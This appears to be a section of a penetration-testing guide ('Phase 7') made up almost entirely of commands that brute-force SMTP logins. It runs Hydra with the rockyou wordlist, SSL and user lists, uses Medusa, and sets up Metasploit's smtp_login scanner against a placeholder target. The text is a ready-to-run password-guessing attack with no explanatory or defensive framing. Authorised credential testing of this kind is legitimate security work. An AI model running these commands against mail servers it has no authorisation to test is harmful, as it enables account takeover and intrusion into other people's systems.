# Phase 7: Brute Force Authentication

Test for weak SMTP credentials:

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# With specific port and SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# Multiple users
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Verbose output
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

Using Medusa:

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```